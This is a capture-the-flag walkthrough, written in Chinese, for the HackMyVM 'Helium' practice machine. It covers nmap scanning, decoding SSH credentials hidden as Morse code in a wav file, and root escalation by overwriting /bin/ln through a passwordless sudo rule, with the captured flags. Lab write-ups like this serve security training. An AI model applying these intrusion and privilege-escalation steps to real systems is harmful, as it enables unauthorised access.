# Helium

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-11-22

✔️ MD5 // 6c034ba16620358483d344f0572ad020

☠ Root // 159

💀 User // 163

📝Notes //
Enjoy. Tested on virtualbox.

:::

## 靶机启动

![靶机启动](img/image_20231251-225142.png)

靶机 IP：

```plaintext
192.168.56.110
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.110
Host is up (0.00051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12f6555fc6fafb1415ae4a2b38d84a30 (RSA)
|   256 b7ac876dc4f9e39ad46ee04fdaaa2220 (ECDSA)
|_  256 fee805af234d3a822a649bf735e4444a (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: RELAX
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:0E:BF:60 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 探测 web 服务

![直接访问](img/image_20231253-225358.png)

查看原始返回

```bash
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Vulny]
└──╼ $http get http://192.168.56.110/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Sat, 23 Dec 2023 14:54:31 GMT
ETag: W/"5fbaba1e-212"
Last-Modified: Sun, 22 Nov 2020 19:21:02 GMT
Server: nginx/1.14.2
Transfer-Encoding: chunked

<title>RELAX</title>
<!doctype html>
<html lang="en">

<!-- Please paul, stop uploading weird .wav files using /upload_sound -->

<head>
<style>
body {
  background-image: url('screen-1.jpg');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: 100% 100%;
}
</style>
    <link href="bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
<audio src="relax.wav" preload="auto loop" controls></audio>
</body>
```

发现可能存在以下用户

```plaintext
paul
```

尝试目录扫描，并结合已经得到信息，得到以下信息

```plaintext
http://192.168.56.110/upload_sound/
http://192.168.56.110/yay/
http://192.168.56.110/bootstrap.min.css
```

访问 `http://192.168.56.110/bootstrap.min.css` 得到：

```plaintext
/yay/mysecretsound.wav
```

## 分析 wav 文件

将文件下载到本地后，使用 `audacity` 进行查看

![audacity 直接打开](img/image_20231216-111632.png)

发现频谱图存在信息，使用 [Morse Code Adaptive Audio Decoder | Morse Code World](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) 进行查看

![Morse Code World 在线解析](img/image_20231218-111805.png)

发现提取出来两份字符串：

```plaintext
ETAIE4SIET
dancingpassyo
```

结合上文得到的用户名，怀疑是 SSH 的登录凭据

## 凭据利用

利用一下凭据

```plaintext
paul:dancingpassyo
```

登陆成功

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $pwncat-cs paul@192.168.56.110
[11:24:13] Welcome to pwncat 🐈!                                                                                      __main__.py:164
Password: *************
[11:24:20] 192.168.56.110:22: normalizing shell path                                                                   manager.py:957
[11:24:21] 192.168.56.110:22: registered new host w/ db                                                                manager.py:957
(local) pwncat$ back
(remote) paul@helium:/home/paul$ whoami
paul
```

## user pwned

```bash
(remote) paul@helium:/home/paul$ cat user.txt
ilovetoberelaxed
```

## 提权探测

```plaintext title="sudo -l"
Matching Defaults entries for paul on helium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln
```

发现可以无密码执行 `/usr/bin/ln` 程序

## 尝试提权

```bash
(remote) paul@helium:/home/paul$ sudo ln -fs /bin/sh /bin/ln
(remote) paul@helium:/home/paul$ sudo ln
[](remote)[] []root@helium[]:[]/home/paul[]$ whoami
root
```

## root pwned

```bash
[](remote)[] []root@helium[]:[]/root[]$ cat root.txt
ilovetoberoot
```
